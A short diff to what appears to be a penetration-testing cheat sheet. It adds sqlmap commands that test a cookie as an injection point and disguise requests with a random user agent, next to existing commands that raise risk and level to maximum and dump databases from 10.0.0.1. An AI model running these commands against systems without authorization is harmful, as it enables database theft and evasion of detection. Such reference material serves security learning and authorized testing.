@@ -23,6 +23,12 @@ sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbms=mysql
 # --level=5 (max)
 sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --risk=3 --level=5 --dump
 
+# Cookie (--cookie)
+sqlmap -u "http://10.0.0.1" --cookie="value=*" --dbs --dump
+
+# Random agent (--random-agent)
+sqlmap -u "http://10.0.0.1" --data="username=test" --random-agent --dump
+
 # --headers: custom HTTP header
 sqlmap --headers="Cookie: value=1234" -u "http://10.0.0.1" --data="username=test&password=test" --dbs --dump
 ```
